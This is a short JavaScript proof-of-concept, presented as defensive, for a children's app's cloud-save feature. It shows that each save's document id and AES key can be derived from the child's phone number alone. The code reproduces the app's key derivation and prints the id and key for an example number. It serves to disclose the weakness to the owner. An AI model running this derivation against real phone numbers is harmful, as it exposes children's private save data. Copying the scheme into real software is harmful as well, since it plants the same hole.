// Defensive proof-of-concept: show the cloud-save doc-id and AES key are a pure function
// of the account's phone number (plus fixed public constants). Uses the app's OWN algorithms
// (copied verbatim from hansen_cloud_save_v965.js) so the owner can confirm the exposure.
import crypto from 'node:crypto';
const ALPHABET = '0123456789ABCDEFGHJKMNPQRSTVWXYZ';
const ACCT_PREFIX = 'HSNACCT';
function keyFromUid(uid){
  const CH = ALPHABET; let h1=0x811c9dc5>>>0, h2=0x01000193>>>0; const s = ACCT_PREFIX+':'+uid;
  for(let i=0;i<s.length;i++){ h1=((h1 ^ s.charCodeAt(i))>>>0)*16777619>>>0; h2=((h2 + s.charCodeAt(i)*(i+7))>>>0)*2654435761>>>0; }
  let out=''; for(let j=0;j<16;j++){ h1=(h1*1664525+1013904223)>>>0; h2=(h2 ^ (h1>>>13))>>>0; out+=CH.charAt(((h1^h2)>>>0)%CH.length); }
  return out.slice(0,4)+'-'+out.slice(4,8)+'-'+out.slice(8,12)+'-'+out.slice(12,16);
}
function normalizeKey(input){ let s=String(input||'').toUpperCase().replace(/[^0-9A-Z]/g,'').replace(/O/g,'0').replace(/[IL]/g,'1').replace(/U/g,'V'); if(s.length!==16) return null; for(let i=0;i<16;i++) if(ALPHABET.indexOf(s[i])<0) return null; return s; }
// accountIdent for a signed-in phone account -> 'p:'+digits (strip +86)
function identFromPhone(phone){ let ph=String(phone).replace(/[\s\-()]/g,'').replace(/^\+?86/,''); return /^\d{6,15}$/.test(ph) ? 'p:'+ph : null; }
function docIdOf(saveKey){ return crypto.createHash('sha256').update('hansen-doc-v1:'+saveKey).digest('hex'); }
function aesKeyOf(saveKey){ return crypto.createHash('sha256').update('hansen-aes-v1:'+saveKey).digest(); }

// A child's phone number is the ONLY per-user secret in the derivation.
const phone = '13900000000';           // example 11-digit CN mobile
const ident = identFromPhone(phone);    // 'p:13900000000'
const rawKey = keyFromUid(ident);       // deterministic 16-char key (with dashes)
const key = normalizeKey(rawKey) || rawKey;  // what upload/fetch actually use
const docId = docIdOf(key);
const aesKey = aesKeyOf(key).toString('hex');
console.log('phone        :', phone);
console.log('accountIdent :', ident, '  <-- pure function of phone');
console.log('save key     :', rawKey);
console.log('normalized   :', key);
console.log('hansen_saves doc _id (SHA-256) :', docId);
console.log('AES-GCM key (SHA-256, hex)     :', aesKey.slice(0,32)+'...');
console.log('\nConclusion: anyone who knows a child\'s phone number can recompute this exact doc _id');
console.log('and AES key with no secret. Under hansen_saves = "read all, write own", every logged-in');
console.log('user can read every document, so phone number alone decrypts that child\'s whole save.');
